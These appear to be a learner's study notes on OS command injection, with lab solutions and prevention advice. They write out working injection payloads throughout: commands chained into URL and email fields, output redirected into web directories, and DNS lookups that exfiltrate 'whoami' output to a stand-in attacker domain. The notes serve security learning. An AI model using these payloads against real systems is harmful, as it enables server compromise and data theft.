OS Command Injection also known as shell injection. In OS Command Injection the OS 
commands are executed at the server side on which the appication is running.
This vulnerability can be subjected to full compromise of the targetted machine.

https://insecure-website.com/stockStatus?productID=381&storeID=29

This search results in the command stockreport.pl 381 29
This resulst in the display of the items that have searched for..

The vulnerability for OS Command Injection is verified by the following simple payload 
"& echo aiwefwlguh &"

Example:
stockreport.pl & echo aiwefwlguh & 29
This outputs the echoed string in the output.


USEFUL COMMANDS
Purpose of command	Linux	Windows
Name of current user	whoami	whoami
Operating system	uname -a	ver
Network configuration	ifconfig	ipconfig /all
Network connections	netstat -an	netstat -an
Running processes	ps -ef	tasklist

Blind Command Injection Vulnerabilities---
The command injection succeeded but the output is not displayed in the HTTP 
response..This is calles Blind OS Command Injection Vulnerabilities.
In this case we need to use some other techniques to detect the Command Injection 
Vulnerabilities.

Methods:
1. Detecting using timing Delays
	& ping -c 10 127.0.0.1 &
	This lets the attacker to ping his network loopback for 10 seconds.

2. Exploiting the Blind OS Command Injection vulnerabiities by redirecting the output.
	& whoami > /var/www/static/whoami.txt &
	The output can be accessed by https://vulnerable-website.com/whoami.txt
3. Exploiting blind OS command injection using out-of-band (OAST) techniques.
	You can use an injected command that will trigger an out-of-band network 
	interaction with a system that you control, using OAST techniques. 

	& nslookup kgji2ohoyw.web-attacker.com &
This payload uses the nslookup command to cause a DNS lookup for the specified domain. 
The attacker can monitor to see if the lookup happens, to confirm if the 
command was successfully injected.

The out-of-band channel provides an easy way to exfiltrate the output from injected 
commands:

& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
This causes a DNS lookup to the attacker's domain containing the result of the whoami 
command:

wwwuser.kgji2ohoyw.web-attacker.com

 Labs:

1. OS Command Injection Simple Case
	Echoing the whoami command in the search bar
	&whomai&
2. Blind OS Command Injection with time delays
	email=x||ping+-c+10+127.0.0.1||
	 
3. Blind OS Command Injection with output redirection.
	email=||whoami>/var/www/images/output.txt||

4. Blind OS Command Injection with out-of-band-interaction.
	email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||

5. Blind OS Command Injection with out-of-band data exfiltration.
	email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||


Ways of Injecting Commands
Command Seperators for both Unix and Windows
&
&&
|
||

Only Unix
;
Newline (0x0a or \n)

On Unix-based systems, you can also use backticks or the dollar character to perform 
inline execution of an injected command within the original command:

`
injected command `
$(
injected command )


Prevention:
1. Never call for an os command from aplication-layer code.
2. If it is necessary then follow the below steps:
	Validating against a whitelist of permitted values.
	Validating that the input is a number.
	Validating that the input contains only alphanumeric characters, no other syntax or 
	whitespace.
